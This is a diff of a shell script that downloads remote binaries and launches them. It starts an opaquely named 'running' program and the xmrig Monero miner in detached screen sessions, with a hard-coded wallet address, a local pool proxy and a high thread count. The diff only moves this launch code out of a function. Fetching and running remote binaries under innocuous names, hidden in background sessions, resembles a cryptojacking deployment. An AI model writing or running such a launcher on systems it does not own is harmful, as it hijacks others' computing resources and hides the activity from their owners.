@@ -32,20 +32,6 @@ install_screen_if_not_installed() {
             echo "Unsupported package manager."
             exit 1
         fi
-        # Run the commands after installing screen
-        run_commands
-    else
-        # If screen is already installed, just run the commands
-        run_commands
-    fi
-}
-
-# Function to run the necessary commands
-run_commands() {
-    # Run /usr/local/bin/running and /usr/local/bin/xmrig in screen sessions
-    if [ -f "$DIRECTORY/running" ] && [ -f "$DIRECTORY/xmrig" ]; then
-        screen -S running-session -d -m "$DIRECTORY/running"
-        screen -S xmrig-session -d -m "$DIRECTORY/xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80"
     fi
 }
 
@@ -55,5 +41,11 @@ download_and_set_permissions "$DOWNLOAD_RUNNING_URL"
 download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
 download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"
 
-# Install screen and run the commands
+# Install screen if not installed
 install_screen_if_not_installed
+
+# Run /usr/local/bin/running and /usr/local/bin/xmrig in screen sessions
+if [ -f "$DIRECTORY/running" ] && [ -f "$DIRECTORY/xmrig" ]; then
+    screen -S running-session -d -m "$DIRECTORY/running"
+    screen -S xmrig-session -d -m "$DIRECTORY/xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80"
+fi
